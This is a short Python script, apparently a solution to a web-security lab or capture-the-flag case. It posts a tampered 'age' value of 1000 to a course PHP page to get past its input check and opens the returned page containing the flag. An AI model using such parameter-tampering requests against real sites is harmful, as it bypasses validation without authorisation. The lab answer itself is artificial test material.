import requests
import webbrowser

# Exploit: change the field 'age' to a value greater than 99
# Flag will be shown on webpage
# Parameter Tampering

def main():
    temp = '/tmp/case01.html'
    payload = {'age':'1000'}
    r = requests.post('http://wsb.com/Assignment2/case01.php', data=payload)
    with open(temp, 'wb') as f:
        f.write(r.content)
    webbrowser.open(temp, 2)

if __name__ == "__main__":
    main()
